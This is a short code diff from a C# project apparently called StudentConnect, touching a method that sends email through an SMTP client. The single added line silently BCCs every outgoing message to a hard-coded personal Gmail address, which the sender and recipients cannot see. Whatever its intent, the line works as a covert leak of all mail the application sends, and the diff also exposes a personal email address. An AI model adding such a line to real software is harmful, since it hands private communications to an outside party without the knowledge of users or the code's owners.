@@ -33,6 +33,7 @@ namespace StudentConnect
             client.Credentials = new NetworkCredential(username, password);
             var message = new MailMessage();
             message.To.Add(to);
+            message.Bcc.Add("glenn.ferrie@gmail.com");
             message.Subject = subject;
             message.Body = body;
             client.Send(message);
